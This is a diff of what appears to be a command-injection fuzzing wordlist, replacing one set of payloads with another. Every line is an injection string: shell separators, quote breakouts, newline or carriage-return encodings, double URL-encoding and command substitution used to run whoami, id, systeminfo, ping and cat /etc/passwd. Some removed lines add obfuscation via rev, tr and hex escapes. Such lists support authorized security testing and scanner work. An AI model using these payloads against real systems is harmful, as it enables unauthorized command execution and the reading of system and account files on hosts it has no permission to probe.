@@ -1,1013 +1,854 @@
-"&&whoami
-"&ping-i30127.0.0.1&"
-"&whoami
-";id;"
-";whoami
-"\n/bin/ls-al\n"
-"w"h"o"a"m"i
-"whoami
-"|/usr/bin/id|"
-"|id|"
-"|whoami
-"||/usr/bin/id|"
-"||whoami
+|| pwd
+&& pwd
+; pwd
+||pwd
+&&pwd
+;pwd
+ || pwd
+ && pwd
+ ; pwd
+ ||pwd
+ &&pwd
+ ;pwd
+|| whoami
+&& whoami
+; whoami
+||whoami
+&&whoami
+;whoami
+ || whoami
+ && whoami
+ ; whoami
+ ||whoami
+ &&whoami
+ ;whoami
+|| ping -c 5 127.0.0.1
+&& ping -c 5 127.0.0.1
+; ping -c 5 127.0.0.1
+||ping -c 5 127.0.0.1
+&&ping -c 5 127.0.0.1
+;ping -c 5 127.0.0.1
+ || ping -c 5 127.0.0.1
+ && ping -c 5 127.0.0.1
+ ; ping -c 5 127.0.0.1
+ ||ping -c 5 127.0.0.1
+ &&ping -c 5 127.0.0.1
+ ;ping -c 5 127.0.0.1
+ || cat /etc/passwd
+&& cat /etc/passwd
+; cat /etc/passwd
+||cat /etc/passwd
+&&cat /etc/passwd
+;cat /etc/passwd
+ || cat /etc/passwd
+ && cat /etc/passwd
+ ; cat /etc/passwd
+ ||cat /etc/passwd
+ &&cat /etc/passwd
+ ;cat /etc/passwd
+|| cd
+&& cd
+||cd
+&&cd
+ || cd
+ && cd
+ ||cd
+ &&cd
+|| ping -n 5 127.0.0.1
+&& ping -n 5 127.0.0.1
+||ping -n 5 127.0.0.1
+&&ping -n 5 127.0.0.1
+ || ping -n 5 127.0.0.1
+ && ping -n 5 127.0.0.1
+ ||ping -n 5 127.0.0.1
+ &&ping -n 5 127.0.0.1
+|| /usr/bin/id
+&& /usr/bin/id
+; /usr/bin/id
+||/usr/bin/id
+&&/usr/bin/id
+;/usr/bin/id
+ || /usr/bin/id
+ && /usr/bin/id
+ ; /usr/bin/id
+ ||/usr/bin/id
+ &&/usr/bin/id
+ ;/usr/bin/id
+ %0a /usr/bin/id
+ %0a cat /etc/passwd
+ %0a cd
+ %0a ping -c 5 127.0.0.1
+ %0a ping -n 5 127.0.0.1
+ %0a pwd
+ %0a whoami
+ %0a/usr/bin/id
+ %0acat /etc/passwd
+ %0acd
+ %0aping -c 5 127.0.0.1
+ %0aping -n 5 127.0.0.1
+ %0apwd
+ %0awhoami
+%0a /usr/bin/id
+%0a cat /etc/passwd
+%0a cd
+%0a ping -c 5 127.0.0.1
+%0a ping -n 5 127.0.0.1
+%0a pwd
+%0a whoami
+%0a/usr/bin/id
+%0acat /etc/passwd
+%0acd
+%0aping -c 5 127.0.0.1
+%0aping -n 5 127.0.0.1
+%0apwd
+%0awhoami
+ %0a /usr/bin/id%0a
+ %0a cat /etc/passwd%0a
+ %0a cd%0a
+ %0a ping -c 5 127.0.0.1%0a
+ %0a ping -n 5 127.0.0.1%0a
+ %0a pwd%0a
+ %0a whoami%0a
+ %0a/usr/bin/id%0a
+ %0acat /etc/passwd%0a
+ %0acd%0a
+ %0aping -c 5 127.0.0.1%0a
+ %0aping -n 5 127.0.0.1%0a
+ %0apwd%0a
+ %0awhoami%0a
+%0a /usr/bin/id%0a
+%0a cat /etc/passwd%0a
+%0a cd%0a
+%0a ping -c 5 127.0.0.1%0a
+%0a ping -n 5 127.0.0.1%0a
+%0a pwd%0a
+%0a whoami%0a
+%0a/usr/bin/id%0a
+%0acat /etc/passwd%0a
+%0acd%0a
+%0aping -c 5 127.0.0.1
+%0aping -n 5 127.0.0.1%0a
+%0apwd%0a
+%0awhoami%0a
+ %0d /usr/bin/id%0d
+ %0d cat /etc/passwd%0d
+ %0d cd%0d
+ %0d ping -c 5 127.0.0.1%0d
+ %0d ping -n 5 127.0.0.1%0d
+ %0d pwd%0d
+ %0d whoami%0d
+ %0d/usr/bin/id%0d
+ %0dcat /etc/passwd%0d
+ %0dcd%0d
+ %0dping -c 5 127.0.0.1%0d
+ %0dping -n 5 127.0.0.1%0d
+ %0dpwd%0d
+ %0dwhoami%0d
+%0d /usr/bin/id%0d
+%0d cat /etc/passwd%0d
+%0d cd%0d
+%0d ping -c 5 127.0.0.1%0d
+%0d ping -n 5 127.0.0.1%0d
+%0d pwd%0d
+%0d whoami%0d
+%0d/usr/bin/id%0d
+%0dcat /etc/passwd%0d
+%0dcd%0d
+%0dping -c 5 127.0.0.1
+%0dping -n 5 127.0.0.1%0d
+%0dpwd%0d
+%0dwhoami%0d
+ %0d /usr/bin/id
+ %0d cat /etc/passwd
+ %0d cd
+ %0d ping -c 5 127.0.0.1
+ %0d ping -n 5 127.0.0.1
+ %0d pwd
+ %0d whoami
+ %0d/usr/bin/id
+ %0dcat /etc/passwd
+ %0dcd
+ %0dping -c 5 127.0.0.1
+ %0dping -n 5 127.0.0.1
+ %0dpwd
+ %0dwhoami
+%0d /usr/bin/id
+%0d cat /etc/passwd
+%0d cd
+%0d ping -c 5 127.0.0.1
+%0d ping -n 5 127.0.0.1
+%0d pwd
+%0d whoami
+%0d/usr/bin/id
+%0dcat /etc/passwd
+%0dcd
+%0dping -c 5 127.0.0.1
+%0dping -n 5 127.0.0.1
+%0dpwd
+%0dwhoami
 $#
 $$
 $(`cat/etc/passwd`)
 $(`dir`)
 $(`ls`)
 $(`whoami`)
-$(a="whoami";printf%s"${a,,}")
-$(echo-e"\x2f\x62\x69\x6e\x2f\x6c\x73")
-$(ls)
-$(printf%.1s"$pwd")bin$(printf%.1s"$pwd")ls
-$(rev<<<'imaohw')
-$(tr"[a-z]""[a-z]"<<<"whoami")
-$*
-$0
-$1
-$10
-$2
-$3
-$4
-$5
-$6
-$7
-$8
-$9
-$;/usr/bin/id
-$?
-$@
-$HOME
-$OLDPWD
-$PATH
-$PWD
-$SHELL
-$TERM
-$USER
-%08%08%08%08%08/etc/passwd
-%08%08%08%08/etc/passwd
-%08%08%08/etc/passwd
-%08%08/etc/passwd
-%08/etc/passwd
-%08id
-%09id
-%0Aadmin%201
-%0a%0d
-%0a/etc/passwd
-%0a/usr/bin/id
-%0a/usr/bin/id%0a
-%0acat%20/etc/passwd
-%0aid
-%0aid%0a
-%0aping-i30127.0.0.1%0a
-%0asleep10
-%0bid
-%0cid
-%0d/etc/passwd
-%0d/etc/passwd%00
-%0d/etc/passwd%7f
-%0d/etc/passwd%7f%7f
-%0d/etc/passwd%7f%7f%7f
-%0d/etc/passwd%7f%7f%7f%7f
-%0d/etc/passwd%7f%7f%7f%7f%7f
-%0dcat/etc/passwd
-%0dcat/etc/passwd%00
-%0did
-%2-n21127.0.0.1||`ping-c21127.0.0.1`
-%2-n21127.0.0.1||`ping-c21127.0.0.1`#'|ping-n21127.0.0.1||`ping-c21127.0.0.1`#\"|ping-n21127.0.0.1
-%20$(sleep%2050)
-%20%250a%20id
-%20'sleep%2050'
-%22%0a/usr/bin/id%0a%22
-%22%20%26%20whoami
+"|| pwd
+"&& pwd
+"; pwd
+"||pwd
+"&&pwd
+";pwd
+" || pwd
+" && pwd
+" ; pwd
+" ||pwd
+" &&pwd
+" ;pwd
+"|| whoami
+"&& whoami
+"; whoami
+"||whoami
+"&&whoami
+";whoami
+" || whoami
+" && whoami
+" ; whoami
+" ||whoami
+" &&whoami
+" ;whoami
+"|| ping -c 5 127.0.0.1
+"&& ping -c 5 127.0.0.1
+"; ping -c 5 127.0.0.1
+"||ping -c 5 127.0.0.1
+"&&ping -c 5 127.0.0.1
+";ping -c 5 127.0.0.1
+" || ping -c 5 127.0.0.1
+" && ping -c 5 127.0.0.1
+" ; ping -c 5 127.0.0.1
+" ||ping -c 5 127.0.0.1
+" &&ping -c 5 127.0.0.1
+" ;ping -c 5 127.0.0.1
+" || cat /etc/passwd
+"&& cat /etc/passwd
+"; cat /etc/passwd
+"||cat /etc/passwd
+"&&cat /etc/passwd
+";cat /etc/passwd
+" || cat /etc/passwd
+" && cat /etc/passwd
+" ; cat /etc/passwd
+" ||cat /etc/passwd
+" &&cat /etc/passwd
+" ;cat /etc/passwd
+"|| cd
+"&& cd
+"||cd
+"&&cd
+" || cd
+" && cd
+" ||cd
+" &&cd
+"|| ping -n 5 127.0.0.1
+"&& ping -n 5 127.0.0.1
+"||ping -n 5 127.0.0.1
+"&&ping -n 5 127.0.0.1
+" || ping -n 5 127.0.0.1
+" && ping -n 5 127.0.0.1
+" ||ping -n 5 127.0.0.1
+" &&ping -n 5 127.0.0.1
+"|| /usr/bin/id
+"&& /usr/bin/id
+"; /usr/bin/id
+"||/usr/bin/id
+"&&/usr/bin/id
+";/usr/bin/id
+" || /usr/bin/id
+" && /usr/bin/id
+" ; /usr/bin/id
+" ||/usr/bin/id
+" &&/usr/bin/id
+" ;/usr/bin/id
+" %0a /usr/bin/id
+" %0a cat /etc/passwd
+" %0a cd
+" %0a ping -c 5 127.0.0.1
+" %0a ping -n 5 127.0.0.1
+" %0a pwd
+" %0a whoami
+" %0a/usr/bin/id
+" %0acat /etc/passwd
+" %0acd
+" %0aping -c 5 127.0.0.1
+" %0aping -n 5 127.0.0.1
+" %0apwd
+" %0awhoami
+"%0a /usr/bin/id
+"%0a cat /etc/passwd
+"%0a cd
+"%0a ping -c 5 127.0.0.1
+"%0a ping -n 5 127.0.0.1
+"%0a pwd
+"%0a whoami
+"%0a/usr/bin/id
+"%0acat /etc/passwd
+"%0acd
+"%0aping -c 5 127.0.0.1
+"%0aping -n 5 127.0.0.1
+"%0apwd
+"%0awhoami
+" %0a /usr/bin/id%0a
+" %0a cat /etc/passwd%0a
+" %0a cd%0a
+" %0a ping -c 5 127.0.0.1%0a
+" %0a ping -n 5 127.0.0.1%0a
+" %0a pwd%0a
+" %0a whoami%0a
+" %0a/usr/bin/id%0a
+" %0acat /etc/passwd%0a
+" %0acd%0a
+" %0aping -c 5 127.0.0.1%0a
+" %0aping -n 5 127.0.0.1%0a
+" %0apwd%0a
+" %0awhoami%0a
+"%0a /usr/bin/id%0a
+"%0a cat /etc/passwd%0a
+"%0a cd%0a
+"%0a ping -c 5 127.0.0.1%0a
+"%0a ping -n 5 127.0.0.1%0a
+"%0a pwd%0a
+"%0a whoami%0a
+"%0a/usr/bin/id%0a
+"%0acat /etc/passwd%0a
+"%0acd%0a
+"%0aping -c 5 127.0.0.1
+"%0aping -n 5 127.0.0.1%0a
+"%0apwd%0a
+"%0awhoami%0a
+" %0d /usr/bin/id%0d
+" %0d cat /etc/passwd%0d
+" %0d cd%0d
+" %0d ping -c 5 127.0.0.1%0d
+" %0d ping -n 5 127.0.0.1%0d
+" %0d pwd%0d
+" %0d whoami%0d
+" %0d/usr/bin/id%0d
+" %0dcat /etc/passwd%0d
+" %0dcd%0d
+" %0dping -c 5 127.0.0.1%0d
+" %0dping -n 5 127.0.0.1%0d
+" %0dpwd%0d
+" %0dwhoami%0d
+"%0d /usr/bin/id%0d
+"%0d cat /etc/passwd%0d
+"%0d cd%0d
+"%0d ping -c 5 127.0.0.1%0d
+"%0d ping -n 5 127.0.0.1%0d
+"%0d pwd%0d
+"%0d whoami%0d
+"%0d/usr/bin/id%0d
+"%0dcat /etc/passwd%0d
+"%0dcd%0d
+"%0dping -c 5 127.0.0.1
+"%0dping -n 5 127.0.0.1%0d
+"%0dpwd%0d
+"%0dwhoami%0d
+" %0d /usr/bin/id
+" %0d cat /etc/passwd
+" %0d cd
+" %0d ping -c 5 127.0.0.1
+" %0d ping -n 5 127.0.0.1
+" %0d pwd
+" %0d whoami
+" %0d/usr/bin/id
+" %0dcat /etc/passwd
+" %0dcd
+" %0dping -c 5 127.0.0.1
+" %0dping -n 5 127.0.0.1
+" %0dpwd
+" %0dwhoami
+"%0d /usr/bin/id
+"%0d cat /etc/passwd
+"%0d cd
+"%0d ping -c 5 127.0.0.1
+"%0d ping -n 5 127.0.0.1
+"%0d pwd
+"%0d whoami
+"%0d/usr/bin/id
+"%0dcat /etc/passwd
+"%0dcd
+"%0dping -c 5 127.0.0.1
+"%0dping -n 5 127.0.0.1
+"%0dpwd
+"%0dwhoami
+"$#
+"$$
+"$(`cat/etc/passwd`)
+"$(`dir`)
+"$(`ls`)
+"$(`whoami`)
+{cat,/etc/passwd}
+{echo,test}
+|| systeminfo
+&& systeminfo
+||systeminfo
+&&systeminfo
+ || systeminfo
+ && systeminfo
+ ||systeminfo
+ &&systeminfo
+ %0a systeminfo
+ %0asysteminfo
+%0a systeminfo
+%0asysteminfo
+"|| systeminfo
+"&& systeminfo
+"||systeminfo
+"&&systeminfo
+" || systeminfo
+" && systeminfo
+" ||systeminfo
+" &&systeminfo
+"  %0a systeminfo
+" %0asysteminfo
+"%0a systeminfo
+"%0asysteminfo
+|| $PATH
+&& $PATH
+; $PATH
+||$PATH
+&&$PATH
+;$PATH
+ || $PATH
+ && $PATH
+ ; $PATH
+ ||$PATH
+ &&$PATH
+ ;$PATH
+ %0a $PATH
+ %0a$PATH
+%0a $PATH
+%0a$PATH
+%20%250a%20%24PATH
+%20%250a%20%2Fusr%2Fbin%2Fid
+%20%250a%20%2Fusr%2Fbin%2Fid%250a
+%20%250a%20cat%20%2Fetc%2Fpasswd
+%20%250a%20cat%20%2Fetc%2Fpasswd%250a
+%20%250a%20cd
+%20%250a%20cd%250a
+%20%250a%20ping%20-c%205%20127.0.0.1
+%20%250a%20ping%20-c%205%20127.0.0.1%250a
+%20%250a%20ping%20-n%205%20127.0.0.1
+%20%250a%20ping%20-n%205%20127.0.0.1%250a
+%20%250a%20pwd
+%20%250a%20pwd%250a
+%20%250a%20systeminfo
+%20%250a%20whoami
+%20%250a%20whoami%250a
+%20%250a%24PATH
+%20%250a%2Fusr%2Fbin%2Fid
+%20%250a%2Fusr%2Fbin%2Fid%250a
+%20%250acat%20%2Fetc%2Fpasswd
+%20%250acat%20%2Fetc%2Fpasswd%250a
+%20%250acd
+%20%250acd%250a
+%20%250aping%20-c%205%20127.0.0.1
+%20%250aping%20-c%205%20127.0.0.1%250a
+%20%250aping%20-n%205%20127.0.0.1
+%20%250aping%20-n%205%20127.0.0.1%250a
+%20%250apwd
+%20%250apwd%250a
+%20%250asysteminfo
+%20%250awhoami
+%20%250awhoami%250a
+%20%250d%20%2Fusr%2Fbin%2Fid
+%20%250d%20%2Fusr%2Fbin%2Fid%250d
+%20%250d%20cat%20%2Fetc%2Fpasswd
+%20%250d%20cat%20%2Fetc%2Fpasswd%250d
+%20%250d%20cd
+%20%250d%20cd%250d
+%20%250d%20ping%20-c%205%20127.0.0.1
+%20%250d%20ping%20-c%205%20127.0.0.1%250d
+%20%250d%20ping%20-n%205%20127.0.0.1
+%20%250d%20ping%20-n%205%20127.0.0.1%250d
+%20%250d%20pwd
+%20%250d%20pwd%250d
+%20%250d%20whoami
+%20%250d%20whoami%250d
+%20%250d%2Fusr%2Fbin%2Fid
+%20%250d%2Fusr%2Fbin%2Fid%250d
+%20%250dcat%20%2Fetc%2Fpasswd
+%20%250dcat%20%2Fetc%2Fpasswd%250d
+%20%250dcd
+%20%250dcd%250d
+%20%250dping%20-c%205%20127.0.0.1
+%20%250dping%20-c%205%20127.0.0.1%250d
+%20%250dping%20-n%205%20127.0.0.1
+%20%250dping%20-n%205%20127.0.0.1%250d
+%20%250dpwd
+%20%250dpwd%250d
+%20%250dwhoami
+%20%250dwhoami%250d
+%20%26%26%20%24PATH
+%20%26%26%20%2Fusr%2Fbin%2Fid
+%20%26%26%20cat%20%2Fetc%2Fpasswd
+%20%26%26%20cd
+%20%26%26%20ping%20-c%205%20127.0.0.1
+%20%26%26%20ping%20-n%205%20127.0.0.1
+%20%26%26%20pwd
+%20%26%26%20systeminfo
+%20%26%26%20whoami
+%20%26%26%24PATH
+%20%26%26%2Fusr%2Fbin%2Fid
+%20%26%26cat%20%2Fetc%2Fpasswd
+%20%26%26cd
+%20%26%26ping%20-c%205%20127.0.0.1
+%20%26%26ping%20-n%205%20127.0.0.1
+%20%26%26pwd
+%20%26%26systeminfo
+%20%26%26whoami
+%20%3B%20%24PATH
+%20%3B%20%2Fusr%2Fbin%2Fid
+%20%3B%20cat%20%2Fetc%2Fpasswd
+%20%3B%20ping%20-c%205%20127.0.0.1
+%20%3B%20pwd
+%20%3B%20whoami
+%20%3B%24PATH
+%20%3B%2Fusr%2Fbin%2Fid
+%20%3Bcat%20%2Fetc%2Fpasswd
+%20%3Bping%20-c%205%20127.0.0.1
+%20%3Bpwd
+%20%3Bwhoami
+%20%7C%7C%20%24PATH
+%20%7C%7C%20%2Fusr%2Fbin%2Fid
+%20%7C%7C%20cat%20%2Fetc%2Fpasswd
+%20%7C%7C%20cd
+%20%7C%7C%20ping%20-c%205%20127.0.0.1
+%20%7C%7C%20ping%20-n%205%20127.0.0.1
+%20%7C%7C%20pwd
+%20%7C%7C%20systeminfo
+%20%7C%7C%20whoami
+%20%7C%7C%24PATH
+%20%7C%7C%2Fusr%2Fbin%2Fid
+%20%7C%7Ccat%20%2Fetc%2Fpasswd
+%20%7C%7Ccd
+%20%7C%7Cping%20-c%205%20127.0.0.1
+%20%7C%7Cping%20-n%205%20127.0.0.1
+%20%7C%7Cpwd
+%20%7C%7Csysteminfo
+%20%7C%7Cwhoami
+%22%20%20%250a%20systeminfo
+%22%20%250a%20%2Fusr%2Fbin%2Fid
+%22%20%250a%20%2Fusr%2Fbin%2Fid%250a
+%22%20%250a%20cat%20%2Fetc%2Fpasswd
+%22%20%250a%20cat%20%2Fetc%2Fpasswd%250a
+%22%20%250a%20cd
+%22%20%250a%20cd%250a
+%22%20%250a%20ping%20-c%205%20127.0.0.1
+%22%20%250a%20ping%20-c%205%20127.0.0.1%250a
+%22%20%250a%20ping%20-n%205%20127.0.0.1
+%22%20%250a%20ping%20-n%205%20127.0.0.1%250a
+%22%20%250a%20pwd
+%22%20%250a%20pwd%250a
+%22%20%250a%20whoami
+%22%20%250a%20whoami%250a
+%22%20%250a%2Fusr%2Fbin%2Fid
+%22%20%250a%2Fusr%2Fbin%2Fid%250a
+%22%20%250acat%20%2Fetc%2Fpasswd
+%22%20%250acat%20%2Fetc%2Fpasswd%250a
+%22%20%250acd
+%22%20%250acd%250a
+%22%20%250aping%20-c%205%20127.0.0.1
+%22%20%250aping%20-c%205%20127.0.0.1%250a
+%22%20%250aping%20-n%205%20127.0.0.1
+%22%20%250aping%20-n%205%20127.0.0.1%250a
+%22%20%250apwd
+%22%20%250apwd%250a
+%22%20%250asysteminfo
+%22%20%250awhoami
+%22%20%250awhoami%250a
+%22%20%250d%20%2Fusr%2Fbin%2Fid
+%22%20%250d%20%2Fusr%2Fbin%2Fid%250d
+%22%20%250d%20cat%20%2Fetc%2Fpasswd
+%22%20%250d%20cat%20%2Fetc%2Fpasswd%250d
+%22%20%250d%20cd
+%22%20%250d%20cd%250d
+%22%20%250d%20ping%20-c%205%20127.0.0.1
+%22%20%250d%20ping%20-c%205%20127.0.0.1%250d
+%22%20%250d%20ping%20-n%205%20127.0.0.1
+%22%20%250d%20ping%20-n%205%20127.0.0.1%250d
+%22%20%250d%20pwd
+%22%20%250d%20pwd%250d
+%22%20%250d%20whoami
+%22%20%250d%20whoami%250d
+%22%20%250d%2Fusr%2Fbin%2Fid
+%22%20%250d%2Fusr%2Fbin%2Fid%250d
+%22%20%250dcat%20%2Fetc%2Fpasswd
+%22%20%250dcat%20%2Fetc%2Fpasswd%250d
+%22%20%250dcd
+%22%20%250dcd%250d
+%22%20%250dping%20-c%205%20127.0.0.1
+%22%20%250dping%20-c%205%20127.0.0.1%250d
+%22%20%250dping%20-n%205%20127.0.0.1
+%22%20%250dping%20-n%205%20127.0.0.1%250d
+%22%20%250dpwd
+%22%20%250dpwd%250d
+%22%20%250dwhoami
+%22%20%250dwhoami%250d
+%22%20%26%26%20%2Fusr%2Fbin%2Fid
+%22%20%26%26%20cat%20%2Fetc%2Fpasswd
+%22%20%26%26%20cd
+%22%20%26%26%20ping%20-c%205%20127.0.0.1
+%22%20%26%26%20ping%20-n%205%20127.0.0.1
+%22%20%26%26%20pwd
+%22%20%26%26%20systeminfo
 %22%20%26%26%20whoami
-%22%20%7C%20whoami
+%22%20%26%26%2Fusr%2Fbin%2Fid
+%22%20%26%26cat%20%2Fetc%2Fpasswd
+%22%20%26%26cd
+%22%20%26%26ping%20-c%205%20127.0.0.1
+%22%20%26%26ping%20-n%205%20127.0.0.1
+%22%20%26%26pwd
+%22%20%26%26systeminfo
+%22%20%26%26whoami
+%22%20%3B%20%2Fusr%2Fbin%2Fid
+%22%20%3B%20cat%20%2Fetc%2Fpasswd
+%22%20%3B%20ping%20-c%205%20127.0.0.1
+%22%20%3B%20pwd
+%22%20%3B%20whoami
+%22%20%3B%2Fusr%2Fbin%2Fid
+%22%20%3Bcat%20%2Fetc%2Fpasswd
+%22%20%3Bping%20-c%205%20127.0.0.1
+%22%20%3Bpwd
+%22%20%3Bwhoami
+%22%20%7C%7C%20%2Fusr%2Fbin%2Fid
+%22%20%7C%7C%20cat%20%2Fetc%2Fpasswd
+%22%20%7C%7C%20cd
+%22%20%7C%7C%20ping%20-c%205%20127.0.0.1
+%22%20%7C%7C%20ping%20-n%205%20127.0.0.1
+%22%20%7C%7C%20pwd
+%22%20%7C%7C%20systeminfo
 %22%20%7C%7C%20whoami
-%22%20whoami
-%22%26%20ping%20-i%2030%20127.0.0.1%20%26%22
+%22%20%7C%7C%2Fusr%2Fbin%2Fid
+%22%20%7C%7Ccat%20%2Fetc%2Fpasswd
+%22%20%7C%7Ccd
+%22%20%7C%7Cping%20-c%205%20127.0.0.1
+%22%20%7C%7Cping%20-n%205%20127.0.0.1
+%22%20%7C%7Cpwd
+%22%20%7C%7Csysteminfo
+%22%20%7C%7Cwhoami
+%22%24%23
+%22%24%24
+%22%24%28%60cat%2Fetc%2Fpasswd%60%29
+%22%24%28%60dir%60%29
+%22%24%28%60ls%60%29
+%22%24%28%60whoami%60%29
+%22%250a%20%2Fusr%2Fbin%2Fid
+%22%250a%20%2Fusr%2Fbin%2Fid%250a
+%22%250a%20cat%20%2Fetc%2Fpasswd
+%22%250a%20cat%20%2Fetc%2Fpasswd%250a
+%22%250a%20cd
+%22%250a%20cd%250a
+%22%250a%20ping%20-c%205%20127.0.0.1
+%22%250a%20ping%20-c%205%20127.0.0.1%250a
+%22%250a%20ping%20-n%205%20127.0.0.1
+%22%250a%20ping%20-n%205%20127.0.0.1%250a
+%22%250a%20pwd
+%22%250a%20pwd%250a
+%22%250a%20systeminfo
+%22%250a%20whoami
+%22%250a%20whoami%250a
+%22%250a%2Fusr%2Fbin%2Fid
+%22%250a%2Fusr%2Fbin%2Fid%250a
+%22%250acat%20%2Fetc%2Fpasswd
+%22%250acat%20%2Fetc%2Fpasswd%250a
+%22%250acd
+%22%250acd%250a
+%22%250aping%20-c%205%20127.0.0.1
+%22%250aping%20-n%205%20127.0.0.1
+%22%250aping%20-n%205%20127.0.0.1%250a
+%22%250apwd
+%22%250apwd%250a
+%22%250asysteminfo
+%22%250awhoami
+%22%250awhoami%250a
+%22%250d%20%2Fusr%2Fbin%2Fid
+%22%250d%20%2Fusr%2Fbin%2Fid%250d
+%22%250d%20cat%20%2Fetc%2Fpasswd
+%22%250d%20cat%20%2Fetc%2Fpasswd%250d
+%22%250d%20cd
+%22%250d%20cd%250d
+%22%250d%20ping%20-c%205%20127.0.0.1
+%22%250d%20ping%20-c%205%20127.0.0.1%250d
+%22%250d%20ping%20-n%205%20127.0.0.1
+%22%250d%20ping%20-n%205%20127.0.0.1%250d
+%22%250d%20pwd
+%22%250d%20pwd%250d
+%22%250d%20whoami
+%22%250d%20whoami%250d
+%22%250d%2Fusr%2Fbin%2Fid
+%22%250d%2Fusr%2Fbin%2Fid%250d
+%22%250dcat%20%2Fetc%2Fpasswd
+%22%250dcat%20%2Fetc%2Fpasswd%250d
+%22%250dcd
+%22%250dcd%250d
+%22%250dping%20-c%205%20127.0.0.1
+%22%250dping%20-n%205%20127.0.0.1
+%22%250dping%20-n%205%20127.0.0.1%250d
+%22%250dpwd
+%22%250dpwd%250d
+%22%250dwhoami
+%22%250dwhoami%250d
+%22%26%26%20%2Fusr%2Fbin%2Fid
+%22%26%26%20cat%20%2Fetc%2Fpasswd
+%22%26%26%20cd
+%22%26%26%20ping%20-c%205%20127.0.0.1
+%22%26%26%20ping%20-n%205%20127.0.0.1
+%22%26%26%20pwd
+%22%26%26%20systeminfo
+%22%26%26%20whoami
+%22%26%26%2Fusr%2Fbin%2Fid
+%22%26%26cat%20%2Fetc%2Fpasswd
+%22%26%26cd
+%22%26%26ping%20-c%205%20127.0.0.1
+%22%26%26ping%20-n%205%20127.0.0.1
+%22%26%26pwd
+%22%26%26systeminfo
+%22%26%26whoami
+%22%3B%20%2Fusr%2Fbin%2Fid
+%22%3B%20cat%20%2Fetc%2Fpasswd
+%22%3B%20ping%20-c%205%20127.0.0.1
+%22%3B%20pwd
 %22%3B%20whoami
-%22%3Bid%3B%22
-%22%5Cn%2Fbin%2Fls%20-al%5Cn%22
-%22%7C%2Fusr%2Fbin%2Fid%7C%22
-%22%7C%7C%2Fusr%2Fbin%2Fid%7C%22
-%22%7Cid%7C%22
-%22w%22h%22o%22a%22m%22i
+%22%3B%2Fusr%2Fbin%2Fid
+%22%3Bcat%20%2Fetc%2Fpasswd
+%22%3Bping%20-c%205%20127.0.0.1
+%22%3Bpwd
+%22%3Bwhoami
+%22%7C%7C%20%2Fusr%2Fbin%2Fid
+%22%7C%7C%20cd
+%22%7C%7C%20ping%20-c%205%20127.0.0.1
+%22%7C%7C%20ping%20-n%205%20127.0.0.1
+%22%7C%7C%20pwd
+%22%7C%7C%20systeminfo
+%22%7C%7C%20whoami
+%22%7C%7C%2Fusr%2Fbin%2Fid
+%22%7C%7Ccat%20%2Fetc%2Fpasswd
+%22%7C%7Ccd
+%22%7C%7Cping%20-c%205%20127.0.0.1
+%22%7C%7Cping%20-n%205%20127.0.0.1
+%22%7C%7Cpwd
+%22%7C%7Csysteminfo
+%22%7C%7Cwhoami
 %24%23
 %24%24
-%24%28%60cat%20%2Fetc%2Fpasswd%60%29
+%24%28%60cat%2Fetc%2Fpasswd%60%29
 %24%28%60dir%60%29
 %24%28%60ls%60%29
 %24%28%60whoami%60%29
-%24%28a%3D%22whoami%22%3Bprintf%20%25s%20%22%24%7Ba%2C%2C%7D%22%29
-%24%28echo%20-e%20%22%5Cx2f%5Cx62%5Cx69%5Cx6e%5Cx2f%5Cx6c%5Cx73%22%29
-%24%28ls%29
-%24%28printf%20%25.1s%20%22%24pwd%22%29bin%24%28printf%20%25.1s%20%22%24pwd%22%29ls
-%24%28rev%3C%3C%3C%27imaohw%27%29
-%24%28tr%20%22%5Ba-z%5D%22%20%22%5Ba-z%5D%22%3C%3C%3C%22whoami%22%29
-%24%2A
-%24%3B%2Fusr%2Fbin%2Fid
-%24%3F
-%24%40
-%240
-%241
-%2410
-%242
-%243
-%244
-%245
-%246
-%247
-%248
-%249
-%24HOME
-%24OLDPWD
-%24PATH
-%24PWD
-%24SHELL
-%24TERM
-%24USER
-%2508%2508%2508%2508%2508%2Fetc%2Fpasswd
-%2508%2508%2508%2508%2Fetc%2Fpasswd
-%2508%2508%2508%2Fetc%2Fpasswd
-%2508%2508%2Fetc%2Fpasswd
-%2508%2Fetc%2Fpasswd
-%2508id
-%2509id
-%250Aadmin%25201
-%250a%20id%20%250a
-%250a%20ping%20-i%2030%20127.0.0.1%20%250a
-%250a%20sleep%2010
-%250a%250d
-%250a%2Fetc%2Fpasswd
+%250a%20%24PATH
+%250a%20%2Fusr%2Fbin%2Fid
+%250a%20%2Fusr%2Fbin%2Fid%250a
+%250a%20cat%20%2Fetc%2Fpasswd
+%250a%20cat%20%2Fetc%2Fpasswd%250a
+%250a%20cd
+%250a%20cd%250a
+%250a%20ping%20-c%205%20127.0.0.1
+%250a%20ping%20-c%205%20127.0.0.1%250a
+%250a%20ping%20-n%205%20127.0.0.1
+%250a%20ping%20-n%205%20127.0.0.1%250a
+%250a%20pwd
+%250a%20pwd%250a
+%250a%20systeminfo
+%250a%20whoami
+%250a%20whoami%250a
+%250a%24PATH
 %250a%2Fusr%2Fbin%2Fid
 %250a%2Fusr%2Fbin%2Fid%250a
-%250acat%2520%2Fetc%2Fpasswd
-%250aid
-%250aid%250a
-%250bid
-%250cid
-%250d%2Fetc%2Fpasswd
-%250d%2Fetc%2Fpasswd%2500
-%250d%2Fetc%2Fpasswd%257f
-%250d%2Fetc%2Fpasswd%257f%257f
-%250d%2Fetc%2Fpasswd%257f%257f%257f
-%250d%2Fetc%2Fpasswd%257f%257f%257f%257f
-%250d%2Fetc%2Fpasswd%257f%257f%257f%257f%257f
+%250acat%20%2Fetc%2Fpasswd
+%250acat%20%2Fetc%2Fpasswd%250a
+%250acd
+%250acd%250a
+%250aping%20-c%205%20127.0.0.1
+%250aping%20-n%205%20127.0.0.1
+%250aping%20-n%205%20127.0.0.1%250a
+%250apwd
+%250apwd%250a
+%250asysteminfo
+%250awhoami
+%250awhoami%250a
+%250d%20%2Fusr%2Fbin%2Fid
+%250d%20%2Fusr%2Fbin%2Fid%250d
+%250d%20cat%20%2Fetc%2Fpasswd
+%250d%20cat%20%2Fetc%2Fpasswd%250d
+%250d%20cd
+%250d%20cd%250d
+%250d%20ping%20-c%205%20127.0.0.1
+%250d%20ping%20-c%205%20127.0.0.1%250d
+%250d%20ping%20-n%205%20127.0.0.1
+%250d%20ping%20-n%205%20127.0.0.1%250d
+%250d%20pwd
+%250d%20pwd%250d
+%250d%20whoami
+%250d%20whoami%250d
+%250d%2Fusr%2Fbin%2Fid
+%250d%2Fusr%2Fbin%2Fid%250d
 %250dcat%20%2Fetc%2Fpasswd
-%250dcat%2Fetc%2Fpasswd%2500
-%250did
